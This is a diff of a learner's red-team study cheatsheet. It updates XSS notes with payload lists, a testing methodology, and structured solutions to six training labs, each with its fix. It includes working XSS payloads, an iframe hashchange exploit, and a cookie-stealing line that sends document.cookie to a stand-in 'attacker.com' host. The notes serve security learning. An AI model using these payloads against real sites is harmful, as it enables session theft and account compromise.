@@ -1,6 +1,6 @@
 MY RED TEAM CHEATSHEET
 Ahmed Ezzat
-Last Updated: July 2026
+Last Updated: August 2026
 
 STATUS TAGS
 [DONE]    = i practiced this, i can do it from memory
@@ -551,10 +551,10 @@ browser executes it thinking it came from the trusted site
 target is the victim's browser, not the server
 
 JavaScript basics needed:
-alert(1)            — popup, basic proof of concept
-document.cookie     — all browser cookies for the site
-document.domain     — domain name, used to confirm XSS in labs
-fetch('url')        — HTTP request, used to exfiltrate data
+alert(1)              — popup, basic proof of concept
+document.cookie       — all browser cookies for the site
+document.domain       — domain name, used to confirm XSS in labs
+fetch('url')          — HTTP request, used to exfiltrate data
 <script>code</script> — executes JavaScript
 
 Types of XSS:
@@ -567,12 +567,12 @@ DOM-BASED  — vulnerability in client-side JavaScript
              page's own JS writes unsanitized input into the DOM
 
 Standard payloads:
-basic:         <script>alert(1)</script>
-img onerror:   <img src=x onerror=alert(1)>
-svg onload:    <svg onload=alert(1)>
-attribute:     " autofocus onfocus=alert(1) x="
+basic:          <script>alert(1)</script>
+img onerror:    <img src=x onerror=alert(1)>
+svg onload:     <svg onload=alert(1)>
+attribute:      " autofocus onfocus=alert(1) x="
 javascript URL: javascript:alert(document.cookie)
-cookie steal:  <script>fetch('https://attacker.com?c='+document.cookie)</script>
+cookie steal:   <script>fetch('https://attacker.com?c='+document.cookie)</script>
 
 Lab goal: make alert(document.domain) execute in the browser
 
@@ -587,14 +587,47 @@ Key concept — innerHTML blocks script tags:
 browsers block <script> injected via innerHTML
 always use event handlers instead: onerror, onload, onfocus, onmouseover
 
+Key concept — event handlers fire on specific triggers:
+onerror   — fires when a resource fails to load (img, script)
+onload    — fires when a resource loads successfully (img, body, iframe)
+onfocus   — fires when element receives focus (input, textarea)
+onmouseover — fires when mouse moves over element
+onhashchange — fires when URL # fragment changes
+
+Key concept — jQuery $() behavior in old versions:
+input starting with < is treated as HTML and creates DOM elements
+input not starting with < is treated as a CSS selector
+attacker uses this by passing HTML payload starting with 
+jQuery creates the element, event fires, JavaScript executes
+
+Key concept — location.hash:
+the # part of the URL — browser never sends it to the server
+attacker controls it by crafting a malicious URL
+hashchange event fires when it changes
+used in DOM XSS when page reads window.location.hash
+
 XSS testing methodology:
-1. find every input point — search boxes, URL params, form fields
+1. find every input point — search boxes, URL params, form fields, URL hash
 2. submit unique test string: xsstest123
-3. view page source: Ctrl+U → search for xsstest123
+3. view page source Ctrl+U — search for xsstest123
 4. identify HTML context surrounding your string
-5. pick payload matching that context
-6. if blocked: try alternative tags/events, try URL encoding
-7. confirm: alert(document.domain) fires = XSS confirmed
+5. identify which parser interprets the input — HTML parser, JS engine, jQuery
+6. determine if breakout is required
+7. pick payload matching that context
+8. if blocked — try alternative tags/events, try URL encoding
+9. confirm: alert(document.domain) fires = XSS confirmed
+
+XSS structured analysis for every lab:
+vulnerability type:
+source:
+sink:
+execution context:
+which parser interprets input:
+need breakout:
+reasoning to payload:
+why vulnerability exists:
+how to prevent:
+attacker impact:
 
 Real bug bounty universal probe:
 "><img src=x onerror=alert(1)>
@@ -605,55 +638,82 @@ output encoding:  convert < to &lt; and > to &gt; before rendering
 CSP header:       restrict which scripts browser will execute
 input validation: reject dangerous characters at input
 
+XSS delivery methods:
+reflected:  craft malicious URL and send to victim
+stored:     submit payload into stored field, fires for every visitor
+DOM:        craft malicious URL with payload in parameter or hash
+exploit server: host iframe page, deliver to victim via lab exploit server
+
+======================================================
+XSS LABS
+======================================================
+
 Lab 01 XSS — Reflected XSS in HTML context — DONE
-payload: <script>alert(1)</script> in search box
+type: reflected
+source: search parameter
+sink: HTML page response
+context: HTML text — data state
+breakout: no
+payload: <script>alert(1)</script>
+why it exists: user input reflected into HTML without encoding
+fix: HTML encode output before rendering
 
-Lab 02 XSS — Stored XSS in comment field — DONE
-payload: <script>alert(1)</script> in comment/input that gets stored
+Lab 02 XSS — Stored XSS in HTML context — DONE
+type: stored
+source: comment field
+sink: stored in database, rendered in page
+context: HTML text — data state
+breakout: no
+payload: <script>alert(1)</script>
+why it exists: stored user input rendered into HTML without encoding
+fix: HTML encode output before rendering, validate input on submission
 
-Lab 03 XSS — DOM XSS via document.write and location.search — DONE
-source: location.search (URL parameter)
-sink: document.write (writes to page)
-payload: <script>alert(1)</script> in search parameter
-why it works: document.write puts your input directly into page HTML
+Lab 03 XSS — DOM XSS via document.write — DONE
+type: DOM
+source: window.location.search
+sink: document.write()
+context: double-quoted attribute value — attribute value state
+breakout: yes — close attribute with "
+payload: "><svg onload=alert(1)>
+why it exists: document.write() used with unsanitized user input
+fix: avoid document.write() — use safe DOM APIs like textContent
 
-Lab 04 XSS — DOM XSS via innerHTML sink — DONE
-source: location.search
-sink: innerHTML assignment
-why script tags fail: browsers block <script> injected via innerHTML
-solution: inject HTML with event handler instead
+Lab 04 XSS — DOM XSS via innerHTML — DONE
+type: DOM
+source: window.location.search
+sink: element.innerHTML
+context: HTML text after innerHTML assignment
+breakout: no — already in HTML context
+script tags: BLOCKED by browser in innerHTML
 payload: <img src=0 onerror="alert(1)">
-rule: innerHTML → always use event handlers not script tags
+why it exists: innerHTML used with unsanitized user input
+fix: use textContent instead of innerHTML — sanitize if HTML required
 
 Lab 05 XSS — DOM XSS in jQuery href attribute — DONE
-source: location.search
-sink: jQuery .attr('href') — changes the back link href
-context: href attribute — executes javascript: protocol when clicked
+type: DOM
+source: window.location.search returnPath parameter
+sink: jQuery .attr('href')
+context: URL context — full href value controlled by attacker
+breakout: no — attacker controls entire href value
 payload: javascript:alert(document.cookie)
-rule: href injection → javascript:alert(document.cookie)
+why it works: browser executes javascript: scheme when link is clicked
+why it exists: untrusted input assigned directly to href without URL validation
+fix: validate URL scheme — only allow http: https: and relative URLs
 
-Lab 06 XSS — DOM XSS via jQuery hashchange event — DONE
-source: location.hash — the # part of the URL, never sent to server
-sink: jQuery $() selector — old versions treat HTML strings as HTML
-event: hashchange — fires when # part of URL changes
-
-why direct hash payload fails:
-hashchange only fires when hash CHANGES
-loading iframe with hash already set = no change = no event
-
-fix — use iframe onload to append hash after page loads:
-<iframe src="LAB-URL" onload="this.src+='#<img src=x onerror=print()>'"></iframe>
-
-how it works:
-1. iframe loads the page with no hash
-2. onload fires after page fully loads
-3. hash is appended to src — triggers hashchange event
-4. jQuery receives the hash value containing HTML
-5. jQuery creates the img element
-6. img src fails, onerror fires, print() executes
-
-delivery: exploit server → iframe in body → deliver to victim
-key insight: attacker hosts the exploit page, victim visits it, payload fires in victim browser
+Lab 06 XSS — DOM XSS via jQuery hashchange — DONE
+type: DOM
+source: window.location.hash
+sink: jQuery $() selector
+context: jQuery selector — old jQuery treats HTML as DOM creation
+breakout: yes — need to escape selector context with HTML starting with 
+interpreter: jQuery 1.8.2 selector engine — not the browser HTML parser
+payload in hash: <img src=x onerror=print()>
+delivery: iframe with onload that appends hash after page loads
+final exploit: <iframe src="LAB-URL" onload="this.src+='#<img src=x onerror=print()>'"></iframe>
+why onload needed: hashchange only fires when hash changes — not on initial load
+why it exists: outdated jQuery treats HTML strings as DOM elements
+               untrusted location.hash passed directly to $()
+fix: upgrade jQuery — never pass untrusted input to $() selector
 
 ======================================================
 THINGS I STILL NEED TO PRACTICE
@@ -681,7 +741,6 @@ THINGS I STILL NEED TO PRACTICE
 [x] VNC access with default credentials — DONE
 [x] MySQL direct access no password — DONE
 [x] SMTP username enumeration — DONE
-[x] find SUID binaries on Metasploitable — DONE
 [x] list users with real shells — DONE
 [x] SSH into Metasploitable — DONE
 [x] read auth.log live while SSHing in — DONE
@@ -689,4 +748,4 @@ THINGS I STILL NEED TO PRACTICE
 [x] built 10+ Python tools from scratch — DONE
 [x] set up GitHub and pushed all tools — DONE
 [x] SQLi complete — 14 labs done — DONE
-[x] XSS labs 1-3 done — DONE
+[x] XSS labs 1-6 done with structured methodology — DONE
